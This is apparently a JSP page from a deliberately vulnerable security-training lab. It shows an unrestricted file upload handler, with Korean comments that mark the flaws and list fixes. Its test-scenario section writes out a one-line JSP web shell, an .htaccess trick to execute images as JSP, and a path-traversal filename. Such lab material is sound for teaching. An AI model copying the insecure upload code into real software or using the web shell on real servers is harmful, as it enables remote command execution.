<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*, java.nio.file.*" %>
<%
  // [VULN] 파일 업로드 - 확장자/타입 검증 없이 웹 접근 가능 경로에 저장
  // [FIX] 1) 화이트리스트 확장자 검증 (.jpg, .png 등만 허용)
  //       2) Content-Type 검증 + 매직바이트 확인
  //       3) 웹 접근 불가 경로에 저장
  //       4) 파일명 랜덤화 (UUID 등)

  String uploadDir = application.getRealPath("/uploads");
  new File(uploadDir).mkdirs();
  String message = "";

  if ("POST".equals(request.getMethod())) {
      javax.servlet.http.Part filePart = null;
      try {
          filePart = request.getPart("file");
      } catch (Exception e) {
          message = "multipart 설정 필요 - web.xml에 multipart-config 추가";
      }
      if (filePart != null && filePart.getSize() > 0) {
          // [VULN] 원본 파일명 그대로 사용 + 확장자 무검증
          String fileName = Paths.get(filePart.getSubmittedFileName()).getFileName().toString();
          filePart.write(uploadDir + File.separator + fileName);
          message = "업로드 완료: <a href='uploads/" + fileName + "'>" + fileName + "</a>";
      }
  }

  // 업로드된 파일 목록
  File dir = new File(uploadDir);
  File[] files = dir.listFiles();
%>
<html>
<head><title>Upload Lab</title></head>
<body>
<h2>File Upload Lab</h2>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="업로드">
</form>
<% if (!message.isEmpty()) { %>
  <p><%=message%></p>
<% } %>

<h3>업로드된 파일</h3>
<ul>
<% if (files != null) for (File f : files) { %>
  <li><a href="uploads/<%=f.getName()%>"><%=f.getName()%></a> (<%=f.length()%> bytes)</li>
<% } %>
</ul>

<hr>
<h3>테스트 시나리오</h3>
<pre>
1) JSP 웹쉘 업로드:
   shell.jsp 내용:
   &lt;%Runtime.getRuntime().exec(request.getParameter("cmd"));%&gt;
   → /vuln/uploads/shell.jsp?cmd=id

2) .htaccess 업로드 (Apache 연동 시):
   AddType application/x-httpd-jsp .jpg
   → 이미지 확장자로 JSP 실행

3) 경로 조작:
   파일명에 ../../../conf/server.xml 시도
</pre>
<a href="index.jsp">← 메인</a>
</body>
</html>
